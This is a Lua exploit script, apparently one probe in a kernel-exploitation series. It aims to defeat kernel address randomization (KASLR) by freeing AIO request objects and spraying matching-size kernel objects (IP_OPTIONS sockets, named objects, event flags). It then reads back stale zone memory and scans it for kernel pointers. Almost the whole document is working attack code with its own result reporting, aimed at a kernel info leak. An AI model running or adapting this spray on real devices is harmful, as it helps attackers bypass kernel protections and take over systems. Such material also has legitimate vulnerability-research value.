-- CRASH_CLASS: LOW
-- PROBE 69d: KASLR defeat via AIO R-object spray
--
-- R (48B, 64B UMA zone) stores curthread+0x390 at R+0x00 and
-- curthread+0x08 at R+0x08 during AIO submission. These kernel
-- pointers are NOT zeroed before uma_zfree. After 662 deletes,
-- they survive in the zone free list.
--
-- Spray strategy:
--   1. Free 64 R objects (662 delete after submit+poll)
--   2. Spray 128 objects of matching size to reclaim R's slot
--   3. Read back spray objects for kernel pointer residue
--
-- Spray types tested:
--   [B] IP_OPTIONS setsockopt (clear readback via getsockopt)
--   [C] namedobj (557) — handle allocation, no direct readback
--   [D] evf (538) — event flag, no direct readback
--
-- For IP_OPTIONS: getsockopt with larger buffer than set length
-- may return stale zone data (uninitialized memory info leak).

print("=== PROBE 69d: KASLR SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local pid = N(mk(20)())
print("pid=" .. pid)

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Open /dev/zero
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function aio_submit()
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd_zero))
    local oid = memory.alloc(8); wd(N(oid), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(oid)))
    end)
    return rd(N(oid)) or 0
end

local function aio_poll(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(664)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_delete(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(662)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

print("")

-- ============================================================
-- [A] Allocate + free 64 R objects (AIO submit/poll/delete)
-- ============================================================
print("[A] Allocate and free 64 R objects")

local AIO_COUNT = 64
local aids = {}
for i = 1, AIO_COUNT do
    local aid = aio_submit()
    if aid ~= 0 then aids[#aids + 1] = aid end
end
print(string.format("  submitted: %d", #aids))

for _, aid in ipairs(aids) do aio_poll(aid) end
print("  polled all")

local del_ok = 0
for _, aid in ipairs(aids) do
    local st = aio_delete(aid)
    if st == 0 then del_ok = del_ok + 1 end
end
print(string.format("  deleted: %d/%d (R objects now freed with kernel ptrs)", del_ok, #aids))
print("")

-- ============================================================
-- [B] Spray: IP_OPTIONS via setsockopt/getsockopt
-- ============================================================
print("[B] Spray: IP_OPTIONS (128 sockets)")

local SPRAY_B = 128
local spray_fds = {}
local opt_buf = memory.alloc(64)
-- Set 4 bytes of IP options (0x41414141)
wd(N(opt_buf), 0x41414141)

for i = 1, SPRAY_B do
    -- socket(AF_INET=2, SOCK_DGRAM=2, 0)
    local ok_s, fd_v = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0))
    end)
    local fd = ok_s and N(fd_v) or -1
    if fd > 0 then
        -- setsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, buf, 4)
        pcall(function()
            mk(105)(uint64(fd), uint64(0), uint64(1), uint64(N(opt_buf)), uint64(4))
        end)
        spray_fds[#spray_fds + 1] = fd
    end
end
print(string.format("  created %d sockets with IP_OPTIONS", #spray_fds))

-- Readback: getsockopt with 64-byte buffer
local kptr_hits_b = 0
local out_b = memory.alloc(64)
local lenp_b = memory.alloc(8)

for idx, fd in ipairs(spray_fds) do
    -- Clear output buffer with sentinel
    for off = 0, 60, 4 do wd(N(out_b) + off, 0xDEDEDEDE) end
    wd(N(lenp_b), 64)

    -- getsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, out_b, lenp_b)
    local ok_g, rv_g = pcall(function()
        return mk(118)(uint64(fd), uint64(0), uint64(1), uint64(N(out_b)), uint64(N(lenp_b)))
    end)
    local ret_len = rd(N(lenp_b)) or 0

    -- Scan all qwords in output for kernel pointers
    for off = 0, 56, 8 do
        local qv = rq(N(out_b) + off)
        if qv and is_kptr(qv) then
            local h, l = get_hi_lo(qv)
            print(string.format("  *** KPTR fd=%d off=%d: 0x%08X%08X ***", fd, off, h, l))
            kptr_hits_b = kptr_hits_b + 1
        end
    end

    -- Report first few and any with data past offset 4
    if idx <= 3 then
        local d0 = rd(N(out_b)) or 0
        local d4 = rd(N(out_b) + 4) or 0
        print(string.format("  sock[%d] fd=%d ret=%s len=%d d0=0x%08X d4=0x%08X",
            idx, fd, ok_g and tostring(N(rv_g)) or "ERR", ret_len, d0, d4))
    end
end

print(string.format("  IP_OPTIONS kernel pointers: %d", kptr_hits_b))

-- Close spray sockets
for _, fd in ipairs(spray_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
print("")

-- ============================================================
-- [C] Spray: namedobj (557)
-- ============================================================
print("[C] Spray: namedobj_create (128 objects)")

-- Re-free R objects (allocate + delete fresh batch)
local aids2 = {}
for i = 1, AIO_COUNT do
    local aid = aio_submit()
    if aid ~= 0 then aids2[#aids2 + 1] = aid end
end
for _, aid in ipairs(aids2) do aio_poll(aid) end
local del2 = 0
for _, aid in ipairs(aids2) do
    if aio_delete(aid) == 0 then del2 = del2 + 1 end
end
print(string.format("  freed %d fresh R objects", del2))

local SPRAY_C = 128
local nobj_handles = {}
for i = 1, SPRAY_C do
    local name_str = put_str(string.format("kslr%04d", i))
    local ok_n, rv_n = pcall(function()
        return mk(557)(uint64(N(name_str)), uint64(0))
    end)
    local handle = ok_n and N(rv_n) or -1
    if handle > 0 then
        nobj_handles[#nobj_handles + 1] = handle
    end
end
print(string.format("  created %d namedobj handles", #nobj_handles))

-- namedobj handles: check if the handle VALUE itself encodes kernel data
local kptr_hits_c = 0
for idx, h in ipairs(nobj_handles) do
    local hq = uint64(h)
    if is_kptr(hq) then
        local hh, hl = get_hi_lo(hq)
        print(string.format("  *** KPTR handle[%d]=0x%08X%08X ***", idx, hh, hl))
        kptr_hits_c = kptr_hits_c + 1
    end
    if idx <= 3 then
        print(string.format("  handle[%d]=0x%08X", idx, h))
    end
end
print(string.format("  namedobj kernel pointers in handles: %d", kptr_hits_c))

-- Delete namedobj spray
for _, h in ipairs(nobj_handles) do
    pcall(function() mk(558)(uint64(h)) end)
end
print("")

-- ============================================================
-- [D] Spray: evf (538)
-- ============================================================
print("[D] Spray: evf_create (128 objects)")

-- Re-free R objects again
local aids3 = {}
for i = 1, AIO_COUNT do
    local aid = aio_submit()
    if aid ~= 0 then aids3[#aids3 + 1] = aid end
end
for _, aid in ipairs(aids3) do aio_poll(aid) end
local del3 = 0
for _, aid in ipairs(aids3) do
    if aio_delete(aid) == 0 then del3 = del3 + 1 end
end
print(string.format("  freed %d fresh R objects", del3))

local SPRAY_D = 128
local evf_handles = {}
for i = 1, SPRAY_D do
    local name_str = put_str(string.format("evfk%04d", i))
    -- evf_create(name, attr): attr=0x100 for named
    local ok_e, rv_e = pcall(function()
        return mk(538)(uint64(N(name_str)), uint64(0x100))
    end)
    local handle = ok_e and N(rv_e) or -1
    if handle > 0 then
        evf_handles[#evf_handles + 1] = handle
    end
end
print(string.format("  created %d evf handles", #evf_handles))

local kptr_hits_d = 0
for idx, h in ipairs(evf_handles) do
    local hq = uint64(h)
    if is_kptr(hq) then
        local hh, hl = get_hi_lo(hq)
        print(string.format("  *** KPTR handle[%d]=0x%08X%08X ***", idx, hh, hl))
        kptr_hits_d = kptr_hits_d + 1
    end
    if idx <= 3 then
        print(string.format("  handle[%d]=0x%08X", idx, h))
    end
end
print(string.format("  evf kernel pointers in handles: %d", kptr_hits_d))

-- Delete evf spray
for _, h in ipairs(evf_handles) do
    pcall(function() mk(539)(uint64(h)) end)
end
print("")

-- ============================================================
-- [E] Deep getsockopt scan: larger option numbers
-- ============================================================
print("[E] Deep getsockopt scan (option numbers 1-20 on fresh socket)")

-- Maybe other socket options return stale zone data
-- Re-free R objects
local aids4 = {}
for i = 1, AIO_COUNT do
    local aid = aio_submit()
    if aid ~= 0 then aids4[#aids4 + 1] = aid end
end
for _, aid in ipairs(aids4) do aio_poll(aid) end
for _, aid in ipairs(aids4) do aio_delete(aid) end

local deep_fd
do
    local ok_s, fd_v = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0))
    end)
    deep_fd = ok_s and N(fd_v) or -1
end
print(string.format("  scan socket fd=%d", deep_fd or -1))

if deep_fd and deep_fd > 0 then
    local deep_out = memory.alloc(256)
    local deep_lenp = memory.alloc(8)
    local kptr_hits_e = 0

    for opt = 1, 20 do
        for off = 0, 252, 4 do wd(N(deep_out) + off, 0xDEDEDEDE) end
        wd(N(deep_lenp), 256)
        local ok_g, rv_g = pcall(function()
            return mk(118)(uint64(deep_fd), uint64(0), uint64(opt), uint64(N(deep_out)), uint64(N(deep_lenp)))
        end)
        local ret_len = rd(N(deep_lenp)) or 0
        local ret_val = ok_g and N(rv_g) or -999

        if ret_val >= 0 and ret_len > 0 then
            -- Scan for kernel pointers
            local found = false
            for off = 0, ret_len - 4, 8 do
                local qv = rq(N(deep_out) + off)
                if qv and is_kptr(qv) then
                    local h, l = get_hi_lo(qv)
                    print(string.format("  *** KPTR opt=%d off=%d: 0x%08X%08X ***", opt, off, h, l))
                    kptr_hits_e = kptr_hits_e + 1
                    found = true
                end
            end
            if not found and ret_len > 4 then
                local d0 = rd(N(deep_out)) or 0
                print(string.format("  opt=%d ret=%d len=%d d0=0x%08X (no kptr)", opt, ret_val, ret_len, d0))
            end
        end
    end

    -- Also try SOL_SOCKET level (0xFFFF) options
    for _, opt in ipairs({0x1001, 0x1002, 0x1005, 0x1007, 0x1008}) do
        for off = 0, 252, 4 do wd(N(deep_out) + off, 0xDEDEDEDE) end
        wd(N(deep_lenp), 256)
        local ok_g, rv_g = pcall(function()
            return mk(118)(uint64(deep_fd), uint64(0xFFFF), uint64(opt), uint64(N(deep_out)), uint64(N(deep_lenp)))
        end)
        local ret_len = rd(N(deep_lenp)) or 0
        local ret_val = ok_g and N(rv_g) or -999

        if ret_val >= 0 and ret_len > 0 then
            for off = 0, ret_len - 4, 8 do
                local qv = rq(N(deep_out) + off)
                if qv and is_kptr(qv) then
                    local h, l = get_hi_lo(qv)
                    print(string.format("  *** KPTR SOL opt=0x%X off=%d: 0x%08X%08X ***", opt, off, h, l))
                    kptr_hits_e = kptr_hits_e + 1
                end
            end
        end
    end

    print(string.format("  deep scan kernel pointers: %d", kptr_hits_e))
    pcall(function() mk(6)(uint64(deep_fd)) end)
end
print("")

-- ============================================================
-- [F] Summary
-- ============================================================
print("[F] SUMMARY")
print(string.format("  IP_OPTIONS kptrs:  %d", kptr_hits_b))
print(string.format("  namedobj kptrs:    %d", kptr_hits_c))
print(string.format("  evf kptrs:         %d", kptr_hits_d))
print(string.format("  process:           %s", N(mk(20)()) == pid and "ALIVE" or "DEAD"))

local total_kptrs = kptr_hits_b + kptr_hits_c + kptr_hits_d
if total_kptrs > 0 then
    print("")
    print("*** KERNEL POINTER LEAKED — KASLR DEFEATED ***")
else
    print("")
    print("No kernel pointers found. Possible reasons:")
    print("  1. Spray objects not in R's 64B zone (wrong size)")
    print("  2. Zone constructors overwrote R+0x00/R+0x08")
    print("  3. UMA per-CPU cache kept R from central free list")
    print("  4. Need more spray volume (try 4096+)")
end

print("")
print("alive=YES")
print("=== PROBE 69d COMPLETE ===")
